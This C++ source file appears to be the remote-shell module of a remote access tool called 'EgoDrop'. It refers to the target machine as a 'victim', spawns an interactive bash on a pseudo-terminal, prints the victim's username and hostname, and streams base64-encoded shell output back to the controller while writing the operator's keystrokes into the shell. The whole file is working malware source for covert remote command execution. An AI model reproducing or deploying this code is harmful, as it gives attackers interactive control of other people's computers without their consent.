#include <iostream>
#include <cstring>
#include <thread>
#include <vector>
#include <string>
#include <memory>
#include <algorithm>
#include <atomic>
#include <unordered_map>
#include <mutex>
#include <pty.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>

//Module.
#include "clsVictim.hpp"
#include "clsEZData.hpp"
#include "clsTools.hpp"

class clsShell
{
private:
    int m_ptyFd = -1;
    pid_t m_pid = -1;

    std::shared_ptr<clsVictim> m_victim;

    std::atomic<bool> m_ready { false };
    std::atomic<bool> m_bIsRunning { false };
    std::thread m_thread;
    std::mutex m_mtx;
    std::vector<std::vector<uint8_t>> m_inputQueue;

public:
    clsShell() = default;

    clsShell(std::shared_ptr<clsVictim> victim)
    {
        m_victim = victim;
    }

    ~clsShell() = default;

    void fnStart(const std::string& szShellPath, const std::string& szInitPath)
    {
        clsTools::fnLogInfo("Starting terminal...");

        if (m_bIsRunning)
            return;

        std::string szShell;
        if (!szShellPath.empty() && access(szShell.c_str(), X_OK) == 0)
            szShell = szShellPath;
        else
            szShell = "bash";

        m_pid = forkpty(&m_ptyFd, nullptr, nullptr, nullptr);
        if (m_pid == 0)
        {
            if (!szInitPath.empty())
            {
                if (chdir(szInitPath.c_str()) != 0)
                    chdir(getenv("HOME"));
            }

            setenv("TERM", "xterm-256color", 1);
            setenv("SHELL", "/bin/bash", 1);

            std::string szCmd =
                "echo '=== EgoDrop Remote Shell ==='; "
                "echo 'User: '$(whoami); "
                "echo 'Host: '$(hostname); "
                "echo '============================'; "
                "exec " + szShell + " -i";

            execlp(
                szShell.c_str(),
                szShell.c_str(),
                "-i",
                "-c",
                szCmd.c_str(),
                nullptr
            );

            _exit(1);
        }

        struct winsize ws {24, 80, 0, 0};
        ioctl(m_ptyFd, TIOCSWINSZ, &ws);

        m_bIsRunning = true;
        m_thread = std::thread([this]() 
        {
            try
            {
                char abBuffer[4096];
                while (m_bIsRunning)
                {
                    fd_set rfds;
                    FD_ZERO(&rfds);
                    FD_SET(m_ptyFd, &rfds);

                    timeval tv {0, 200000};
                    if (select(m_ptyFd + 1, &rfds, nullptr, nullptr, &tv) > 0)
                    {
                        if (FD_ISSET(m_ptyFd, &rfds))
                        {
                            ssize_t n = read(m_ptyFd, abBuffer, sizeof(abBuffer));
                            if (n > 0)
                            {
                                m_ready = true;

                                std::vector<uint8_t> out(abBuffer, abBuffer + n);
                                std::string szB64Data = clsEZData::fnb64Encode(out);

                                STRLIST ls = {
                                    "shell",
                                    "output",
                                    szB64Data,
                                };

                                m_victim->fnSendCommand(ls);
                            }
                        }
                    }

                    std::lock_guard<std::mutex> lock(m_mtx);
                    for (auto& in : m_inputQueue)
                        write(m_ptyFd, in.data(), in.size());

                    m_inputQueue.clear();
                }
            }
            catch (const std::exception& e)
            {
                clsTools::fnLogErr(e.what());
            }
        });

        clsTools::fnLogOK("Start terminal successfully.");
    }

    void fnStop()
    {
        m_bIsRunning = false;
        if (m_thread.joinable())
            m_thread.join();

        if (m_ptyFd != -1)
            close(m_ptyFd);

        clsTools::fnLogInfo("Stop terminal successfully.");
    }

    void fnPushInput(const std::vector<uint8_t>& data)
    {
        if (!m_ready)
            return;

        std::lock_guard<std::mutex> lock(m_mtx);
        m_inputQueue.push_back(data);
    }

    void fnResize(int nCol, int nRow)
    {
        struct winsize ws {};
        ws.ws_col = nCol;
        ws.ws_row = nRow;

        ioctl(m_ptyFd, TIOCSWINSZ, &ws);
    }

    std::string fnGetUserShell()
    {
        struct passwd* pw = getpwuid(getuid());
        if (pw && pw->pw_shell && access(pw->pw_shell, X_OK) == 0)
            return pw->pw_shell;

        return "/bin/bash";
    }
};